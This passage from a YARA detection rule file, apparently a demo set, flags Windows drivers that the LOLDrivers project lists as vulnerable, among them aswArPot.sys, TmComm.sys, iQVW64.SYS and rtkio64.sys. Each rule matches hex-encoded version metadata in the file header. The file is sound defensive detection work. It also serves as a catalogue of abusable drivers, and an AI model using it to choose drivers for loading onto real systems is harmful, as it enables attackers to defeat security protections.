004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000410054004900200054006500630068006e006f006c006f006700690065007300200049006e0063002e002c00200032003000300033 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Computerzsys_Ludashisystemdriver_E502_RID3B82 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:32:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]9c8159275e08 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0033002e00310030002e0031003100310030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0033002e00310030002e0031003100310030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300038002d00320030003100300020007700770077002e006c007500640061007300680069002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpot_Avginternetsecuritysystem_0CD4_RID4515 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:20:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200041006e0074006900200052006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320030002e0033002e00360038002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320030002e0033002e00360038002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000320030002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroaegis_3FA6_RID3E0F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:21:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e00380030002e0030002e0031003000370037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00380030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f002000410045004700490053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300035002d00320030003000390020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_3E1D_RID3DB9 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:06:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e0030002e0030002e0031003100310033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300035002d00320030003100310020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpotsys_Avginternetsecuritysystem_6FB5_RID467C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:20:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310039002e0035002e0034003200320030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310039002e0035002e0034003200320030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310039002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_3B71_RID36A6 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - libnicm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:04:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c0020005800540043004f004d0020005300650072007600690063006500730020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e00310032002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e00310032 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006c00690062006e00690063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310035002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Almicosoftware_Sfdrvxsys_Speedfan_X_0BD1_RID3C42 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - sfdrvx32.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:04:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0053007000650065006400460061006e00200078003300320020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006c006d00690063006f00200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00580032002e00300033002e00310031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00580032002e00300033002e00310031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00730066006400720076007800330032002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0053007000650065006400460061006e } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00730066006400720076007800330032002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200041006c006d00690063006f00200053006f00660074007700610072006500200032003000300031002d0032003000310033 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Almicosoftware_Sfdrvxsys_Speedfan_X_1E94_RID3C3E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - sfdrvx32.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:03:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0053007000650065006400460061006e00200078003300320020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006c006d00690063006f00200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00580032002e00300031002e00300037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00580032002e00300031002e00300037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00730066006400720076007800330032002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0053007000650065006400460061006e } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00730066006400720076007800330032002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200041006c006d00690063006f00200053006f00660074007700610072006500200032003000300031002d0032003000310031 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Hpdevelopmentcompany_Etdsuppsys_Hpetdidriverdll_F744_RID4183 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - etdsupp.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:48:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004500540044006900200053007500700070006f007200740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0048005000200044006500760065006c006f0070006d0065006e007400200043006f006d00700061006e0079 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310038002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310038002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0065007400640073007500700070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0048005000200045005400440069002000440072006900760065007200200044004c004c } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0065007400640073007500700070002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200031003900390031002d00320030003200320020004800650077006c006500740074002d005000610063006b00610072006400200044006500760065006c006f0070006d0065006e007400200043006f006d00700061006e0079002c0020004c002e0050002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Netfiltersys_Windowsrwinddkdriver_DB1D_RID459C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - netfilter2.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:43:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e0065007400460069006c007400650072002000530044004b00200057004600500020004400720069007600650072002000280057005000500029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0035002e0039002e00370020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e00310036003300380035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0065007400660069006c0074006500720032002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0065007400660069006c0074006500720032002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020004e0065007400460069006c00740065007200530044004b002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realtek_Rtkiosys_Realtekiodriver_4ED2_RID3B2D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtkio.sys, rtkio64.sys, rtkiow8x64.sys, rtkiow10x64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:18:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200650061006c00740065006b00200049004f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200650061006c00740065006b00200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003000300039002e0030003700300039002e00320030003200300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e003000300039002e0030003700300039002e0032003000320030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00720074006b0069006f00360034002e0073007900730020 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005200650061006c00740065006b00200049004f00200044007200690076006500720020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00720074006b0069006f00360034002e0073007900730020 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003200300020005200650061006c00740065006b002000530065006d00690063006f006e0064007500630074006f007200200043006f00720070006f0072006100740069006f006e002e00200041006c006c002000520069006700680074002000520065007300650072007600650064002e002000200020002000200020002000200020002000200020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Netfiltersys_1265_RID32FE : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - netfilter2.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:28:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570059004a0053005100200057004600500020004400720069007600650072002000280057005000500029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]5b8f56fe65e05fe7 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0035002e0037002e00380020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e00310036003300380035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0065007400660069006c0074006500720032002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]65e05fe752a0901f5668 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0065007400660069006c0074006500720032002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9002000770079006a00730071002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Intelcorporation_Iqvwsys_Intelriqvwsys_1F81_RID3E08 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iQVW64.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:19:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049006e00740065006c0028005200290020004e006500740077006f0072006b0020004100640061007000740065007200200044006900610067006e006f00730074006900630020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e00740065006c00200043006f00720070006f0072006100740069006f006e0020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0033002e0032002e003100360020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0033002e0032002e00310036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049006e00740065006c0028005200290020006900510056005700360034002e005300590053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300032002d003200300031003800200049006e00740065006c00200043006f00720070006f0072006100740069006f006e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Iobit_Iobitunlockersys_Iobitunlocker_C79A_RID3CE0 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iobitunlocker.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:30:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049004f0062006900740055006e006c006f0063006b006500720020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049004f006200690074 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e00310020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032002e0030002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0049004f0062006900740055006e006c006f0063006b00650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049004f0062006900740055006e006c006f0063006b00650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0049004f0062006900740055006e006c006f0063006b00650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0049004f00620069007400200043006f0070007900720069006700680074002000a900200032003000300035002d0032003000310033 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_16B5_RID3BB3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:40:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f0032003000300030002f0058005000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200031002c00200033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003800200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Phoenixtechnologies_Agentsys_Driveragent_4045_RID3E57 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - Agent64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:33:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004400720069007600650072004100670065006e0074002000440069007200650063007400200049002f004f00200066006f0072002000360034002d006200690074002000570069006e0064006f00770073 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00500068006f0065006e0069007800200054006500630068006e006f006c006f0067006900650073 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004100670065006e007400360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004400720069007600650072004100670065006e0074 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004100670065006e007400360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0045006e0054006500630068002000540061006900770061006e002c00200031003900390037002d0032003000300039 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Ludashicom_Computerzsys_FA77_RID37A9 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:48:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]006c007500640061007300680069002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e00310036002e0031003000300035 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036002e00310036002e0031003000300035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]9c8159275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003100360020007700770077002e006c007500640061007300680069002e0063006f006d } \n   condition: \n     